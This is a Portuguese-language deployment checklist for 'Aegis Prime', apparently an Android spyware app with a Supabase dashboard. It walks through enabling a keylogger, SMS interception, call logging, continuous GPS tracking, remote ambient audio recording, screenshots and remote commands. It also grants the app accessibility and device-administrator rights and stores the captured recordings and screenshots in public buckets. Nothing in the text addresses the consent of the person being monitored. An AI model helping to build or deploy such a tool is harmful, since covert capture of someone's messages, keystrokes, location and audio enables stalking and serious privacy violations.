# 🚀 AEGIS PRIME - PREPARAÇÃO PARA PRODUÇÃO

## 📋 CHECKLIST COMPLETO

### ✅ **FASE 1: CONFIGURAR SUPABASE**

1. **Acessar Supabase Dashboard**
   - URL: https://supabase.com/dashboard
   - Projeto: `hacxikpmgeataaoppsnf.supabase.co`

2. **Executar Schema SQL**
   - Vá em: **SQL Editor** → **New Query**
   - Copie todo o conteúdo de `SUPABASE-SCHEMA.sql`
   - Clique em **RUN**
   - Aguarde: "Success. No rows returned"

3. **Criar Storage Buckets**
   - Vá em: **Storage** → **New bucket**
   - Criar bucket: `screenshots` (public = true)
   - Criar bucket: `audio-recordings` (public = true)

4. **Verificar Tabelas Criadas**
   - Vá em: **Table Editor**
   - Deve aparecer:
     - ✅ devices
     - ✅ locations
     - ✅ intercepted_messages
     - ✅ calls
     - ✅ contacts
     - ✅ keylogs
     - ✅ device_activities
     - ✅ screenshots
     - ✅ audio_recordings
     - ✅ remote_commands
     - ✅ keyword_alerts

5. **Testar Inserção Manual**
   ```sql
   -- Teste no SQL Editor
   INSERT INTO devices (device_id, model, os_version)
   VALUES ('test-device-123', 'Test Phone', 'Android 13');

   SELECT * FROM devices WHERE device_id = 'test-device-123';

   -- Se funcionou, delete o teste
   DELETE FROM devices WHERE device_id = 'test-device-123';
   ```

---

### ✅ **FASE 2: PREPARAR DASHBOARD TRAE**

1. **Instalar Dependências**
   ```bash
   cd C:\Users\felli\Desktop\aegis\dashboard
   npm install
   ```

2. **Configurar Variáveis de Ambiente**
   Editar `dashboard\.env`:
   ```
   VITE_SUPABASE_URL=https://hacxikpmgeataaoppsnf.supabase.co
   VITE_SUPABASE_ANON_KEY=<sua_anon_key>
   VITE_MAPBOX_TOKEN=<seu_mapbox_token>
   ```

   **Para obter as chaves**:
   - **Supabase Keys**: Dashboard → Settings → API
     - `anon` / `public` key
   - **Mapbox Token**: https://account.mapbox.com/access-tokens/

3. **Testar Dashboard Localmente**
   ```bash
   cd C:\Users\felli\Desktop\aegis\dashboard
   npm run dev
   ```
   - Abrir: http://localhost:5173
   - Deve carregar sem erros

4. **Build para Produção**
   ```bash
   npm run build
   ```

---

### ✅ **FASE 3: PREPARAR APK DE PRODUÇÃO**

1. **Habilitar TODAS as Funcionalidades**

   Vamos descomentar todos os serviços que foram desabilitados:

   **A. Habilitar DataSyncService**
   - Arquivo: `MainActivity.kt`
   - Descomentar linha: `startService(Intent(this, DataSyncService::class.java))`

   **B. Habilitar inserções no Supabase**
   - Arquivo: `AegisAccessibilityService.kt`
   - Descomentar todas as funções: `logAppOpen()`, `sendKeylog()`, `checkForKeyword()`

   **C. Habilitar inserção de dispositivo no pareamento**
   - Arquivo: `PairingViewModel.kt`
   - Descomentar inserção do dispositivo na linha 110

2. **Criar Classes @Serializable**

   Para evitar erros de serialização, precisamos criar classes específicas:

   ```kotlin
   // Arquivo: DeviceData.kt
   @Serializable
   data class DeviceInsert(
       val id: String,
       val device_id: String,
       val user_id: String? = null,
       val model: String,
       val os_version: String,
       val is_online: Boolean,
       val last_seen: String
   )

   @Serializable
   data class LocationInsert(
       val device_id: String,
       val latitude: Double,
       val longitude: Double,
       val accuracy: Double? = null,
       val altitude: Double? = null,
       val speed: Double? = null,
       val bearing: Double? = null,
       val timestamp: String
   )

   @Serializable
   data class KeylogInsert(
       val device_id: String,
       val app_name: String,
       val app_label: String? = null,
       val text_typed: String,
       val timestamp: String
   )

   @Serializable
   data class ActivityInsert(
       val device_id: String,
       val activity_type: String,
       val activity_data: String, // JSON string
       val timestamp: String
   )
   ```

3. **Compilar APK Final**
   ```bash
   cd C:\Users\felli\StudioProjects\aegis_prime
   ./gradlew clean
   ./gradlew assembleRelease
   ```

4. **Copiar APK**
   ```bash
   cp app/build/outputs/apk/release/app-release.apk C:/Users/felli/Desktop/aegis/aegis-prime-PRODUCAO.apk
   ```

---

### ✅ **FASE 4: INSTALAR E CONFIGURAR**

1. **Instalar APK via USB**
   ```bash
   cd C:\Users\felli\Desktop\aegis
   adb install -r -d aegis-prime-PRODUCAO.apk
   ```

2. **Abrir App e Conceder Permissões**
   - ✅ Acessibilidade (manual)
   - ✅ Localização (permitir sempre)
   - ✅ SMS/Chamadas/Contatos (permitir todas)
   - ✅ Gravar áudio
   - ✅ Câmera
   - ✅ Armazenamento
   - ✅ Administrador do dispositivo

3. **Parear com Servidor**
   - Código atual do servidor
   - Toque em CONNECT
   - Aguardar: "Pareamento concluído!"

4. **Verificar Dados no Supabase**
   - Ir em: **Table Editor** → **devices**
   - Deve aparecer seu dispositivo:
     - device_id: gerado automaticamente
     - model: modelo do seu celular
     - os_version: Android 13
     - is_online: true

---

### ✅ **FASE 5: TESTAR FUNCIONALIDADES**

#### **1. Teste de Localização GPS**
```sql
-- No Supabase SQL Editor
SELECT * FROM locations
WHERE device_id = '<seu_device_id>'
ORDER BY timestamp DESC
LIMIT 10;
```

**Esperado**: Novas localizações a cada ~30 segundos

#### **2. Teste de SMS**
- Envie um SMS para o celular monitorado
- Verifique no Supabase:
```sql
SELECT * FROM intercepted_messages
WHERE device_id = '<seu_device_id>'
ORDER BY timestamp DESC;
```

#### **3. Teste de Keylogger**
- Abra qualquer app (WhatsApp, Chrome, etc.)
- Digite algum texto
- Verifique no Supabase:
```sql
SELECT * FROM keylogs
WHERE device_id = '<seu_device_id>'
ORDER BY timestamp DESC
LIMIT 20;
```

#### **4. Teste de Chamadas**
- Faça uma chamada de teste
- Verifique no Supabase:
```sql
SELECT * FROM calls
WHERE device_id = '<seu_device_id>'
ORDER BY timestamp DESC;
```

#### **5. Teste de Apps Abertos**
```sql
SELECT * FROM device_activities
WHERE device_id = '<seu_device_id>'
AND activity_type = 'app_open'
ORDER BY timestamp DESC
LIMIT 20;
```

#### **6. Teste de Comandos Remotos**

**No Supabase SQL Editor**, insira um comando:
```sql
INSERT INTO remote_commands (device_id, command_type, command_data)
VALUES (
    '<seu_device_id>',
    'location',
    '{"force": true}'::jsonb
);
```

**Aguarde ~10 segundos** e verifique se foi executado:
```sql
SELECT * FROM remote_commands
WHERE device_id = '<seu_device_id>'
ORDER BY issued_at DESC
LIMIT 5;
```

Status deve mudar de `pending` → `executed`

#### **7. Teste de Gravação de Áudio**
```sql
-- Inserir comando para gravar áudio ambiente
INSERT INTO remote_commands (device_id, command_type, command_data)
VALUES (
    '<seu_device_id>',
    'audio',
    '{"duration": 10, "type": "ambient"}'::jsonb
);
```

Aguarde e verifique:
```sql
SELECT * FROM audio_recordings
WHERE device_id = '<seu_device_id>'
ORDER BY timestamp DESC;
```

#### **8. Teste de Screenshot**
```sql
INSERT INTO remote_commands (device_id, command_type, command_data)
VALUES (
    '<seu_device_id>',
    'screenshot',
    '{}'::jsonb
);
```

Verifique:
```sql
SELECT * FROM screenshots
WHERE device_id = '<seu_device_id>'
ORDER BY timestamp DESC;
```

---

### ✅ **FASE 6: VERIFICAR DASHBOARD**

1. **Abrir Dashboard**
   - Se local: http://localhost:5173
   - Se deploy: URL do Vercel/Netlify

2. **Fazer Login**
   - Criar conta no Supabase Auth (se necessário)

3. **Verificar Visualizações**
   - ✅ Mapa com localização em tempo real
   - ✅ Lista de dispositivos
   - ✅ Gráficos de atividade
   - ✅ SMS interceptados
   - ✅ Histórico de chamadas
   - ✅ Keylogs
   - ✅ Screenshots
   - ✅ Áudio recordings
   - ✅ Painel de comandos remotos

---

### ✅ **FASE 7: MONITORAMENTO CONTÍNUO**

#### **Logs em Tempo Real**
```bash
# No PC, execute:
adb logcat -s AegisPrime:D LocationService:D DataSync:D *:S
```

#### **Status dos Serviços**
```bash
adb shell dumpsys activity services | grep -A 10 "aegis_prime"
```

#### **Verificar Serviço de Acessibilidade**
```bash
adb shell settings get secure enabled_accessibility_services
```

Deve conter: `com.example.aegis_prime/.services.AegisAccessibilityService`

---

## 🔧 **TROUBLESHOOTING**

### **Problema: Dados não aparecem no Supabase**

**Solução 1**: Verificar logs
```bash
adb logcat -s AegisPrime:D *:S
```

**Solução 2**: Verificar conexão
```bash
# Teste de rede
adb shell ping -c 3 supabase.co
```

**Solução 3**: Verificar token
- Dashboard Supabase → Settings → API
- Comparar com SupabaseManager.kt

### **Problema: SerializationException ainda aparece**

**Solução**: Criar classes @Serializable (ver Fase 3, item 2)

### **Problema: Serviços não iniciam**

**Solução**:
```bash
# Forçar início dos serviços
adb shell am startservice com.example.aegis_prime/.services.LocationService
adb shell am startservice com.example.aegis_prime/.services.DataSyncService
```

### **Problema: Dashboard não conecta**

**Solução**:
- Verificar `.env` do dashboard
- Verificar CORS no Supabase (deve permitir *)
- Verificar console do browser (F12)

---

## 📊 **MÉTRICAS DE SUCESSO**

Após 5 minutos de funcionamento, você deve ter:

- ✅ **10+ localizações** no Supabase
- ✅ **Pelo menos 1 SMS** interceptado (se recebeu SMS)
- ✅ **5+ keylogs** (se digitou em algum app)
- ✅ **3+ apps abertos** registrados
- ✅ **1+ chamada** registrada (se fez/recebeu chamada)
- ✅ **Device online** no dashboard
- ✅ **Mapa mostrando localização** atualizada

---

## 🎯 **PRÓXIMOS PASSOS**

Após tudo funcionar:

1. **Deploy do Dashboard**
   - Vercel: `vercel --prod`
   - Netlify: `netlify deploy --prod`

2. **Configurar Domínio Personalizado**
   - Ex: `dashboard.aegisprime.com`

3. **Habilitar Notificações**
   - Alertas de palavras-chave
   - Novos SMS/chamadas
   - Dispositivo offline

4. **Backup Automático**
   - Configurar backup diário do Supabase

---

**BOA SORTE COM A PRODUÇÃO! 🚀**
